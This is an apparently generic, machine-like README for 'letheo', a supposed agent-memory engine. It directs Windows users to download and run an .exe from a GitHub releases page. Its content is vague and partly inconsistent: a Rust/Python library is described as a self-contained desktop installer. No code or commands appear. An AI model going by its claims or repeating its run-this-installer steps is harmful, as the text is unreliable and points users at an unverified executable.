# 🧠 letheo - Give your digital agents lasting memory

[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Annoraprevious80/letheo/releases)

## 📦 What is letheo?

Letheo provides memory for your digital agents. Many programs forget data the moment you close them. This software stores information in a way that allows agents to recall past tasks, conversations, and specific details. It organizes data using vector search. This process mimics how biological brains locate information. It connects Rust processing power with Python flexibility to ensure fast, reliable performance. You use this tool to build smarter agents that learn from their interactions over time.

## 🛠 Prerequisites

You need a computer running Windows 10 or Windows 11. Your system requires at least 8GB of RAM. The software manages heavy data structures, so a solid-state drive is recommended for fast storage. You do not need to install Python or Rust. This package includes everything necessary to run the application on your system. 

## 📥 How to download and install

1. Visit the [official releases page](https://github.com/Annoraprevious80/letheo/releases).
2. Look for the section labeled "Assets" at the bottom of the newest release.
3. Select the file ending in `.exe` to start your download.
4. Open the downloaded file once the process finishes.
5. Follow the prompts on your screen to complete the installation.
6. The installer places a shortcut on your desktop.

## ⚙️ Setting up your first memory store

Open the Letheo application from your desktop icon. The main window appears after the program initializes. 

1. Click the "Create New Store" button.
2. Select a folder on your computer where you want to keep your data.
3. Give your memory store a name.
4. Click "Confirm" to prepare your engine.

The system builds an index. This index organizes your data for rapid recall. You see a green checkmark once the setup finishes.

## 💾 Adding data to memory

Your agents read information from plain text files. Place your documents into the folder you selected during the setup phase. The application detects these files automatically. 

- Use text files for notes, transcripts, or logs.
- Keep file names clear and consistent.
- Letheo scans these files and creates vector embeddings. 

Vector embeddings turn words into numbers. This allows the software to understand the relationship between different concepts. The application performs this task in the background. You track the progress in the status bar at the bottom of the window.

## 🔍 Searching for information

Do you want to know what an agent remembers? Use the search bar at the top of the interface. 

1. Type a question or a keyword into the bar.
2. Press Enter.
3. The software displays the most relevant snippets from your saved files.

The HNSW algorithm handles this search. This method finds results in milliseconds, even if you have thousands of files. Results show the source file and the confidence score. High scores mean the match is strong.

## 🛡 Security and privacy

Your data stays on your computer. Letheo does not send your files to external servers. The memory engine processes all information locally. You control your information at every stage. Delete the memory store folder at any time to remove your data entirely. 

## 🔧 Troubleshooting tips

*   **Application takes time to start:** Large memory stores take a moment to load upon launch. Wait for the status indicator to turn green.
*   **Missing files:** Check if your text files remain in the designated folder. Ensure the file extension is `.txt`.
*   **High CPU usage:** The indexing process consumes processing power while building the library. Minimize the window to let it run in the background.
*   **Memory errors:** Close other demanding applications if you witness sluggish total system performance.

## 📋 Frequently asked questions

**Does this software require an internet connection?**
No. The engine runs offline. You only need the internet to download the initial installer.

**Can I use this with other artificial intelligence tools?**
Yes. Letheo exports indices in standard formats. Other applications read these files easily.

**How much memory can I store?**
The limit depends on your computer storage space. The system handles large datasets without issue.

**Is my data encrypted?**
The software stores files as standard text. You protect your own files using standard Windows folder permissions if you require additional security.

**Does this software work on Windows 7?**
No. It requires modern Windows versions to run the current engine components.

## 🧩 Advanced features

Developers build complex agents using the built-in interface. You can set constraints for how far back the software looks into your history. Adjust these settings in the preferences menu. You define how many results the agent receives when it queries your memory. Lower counts provide precise answers, while higher counts provide context-heavy results. 

## 🚀 Future updates

Updates release periodically. We improve the search speed and memory management with each version. Check the GitHub releases page for announcements regarding new features or stability improvements. The application includes an auto-update prompt that alerts you when a new stable version is available. You download the new installer and run it to update your existing files. Your data remains intact during this process.

## 💡 Best practices for agents

Feed the software high-quality data. Clean, well-structured text leads to better recall for your agents. Avoid duplicate information if possible. Use simple language when writing your documents for the engine. This makes it easier for the software to parse meaning. If you change your data, the system updates the index to reflect these edits. You rarely need to restart the application.

## 🌐 Community and support

The repository contains a list of issues if you find bugs. Use the "New Issue" button to report problems. Be sure to describe your windows version and the steps you took to reach the error. We review these reports to maintain a stable software experience. You also find discussions in the community tab. Use this space to share how you use memory stores in your projects. 

## 📜 License information

The software uses an open-source license. You view the terms in the LICENSE file within the software folder or on the GitHub repository. This license allows you to use the tool for personal and commercial agent projects. You do not pay for the software. All core functions remain free to use. 

## 🔋 System performance

The engine manages resources efficiently. You rarely reach the limits of a modern computer. The Rust component keeps memory usage low, even during complex queries. The Python wrapper provides a simple interface for you to manage your files. This combination strikes a balance between performance and accessibility. Keep your system drivers updated to ensure the best experience with the vector engine.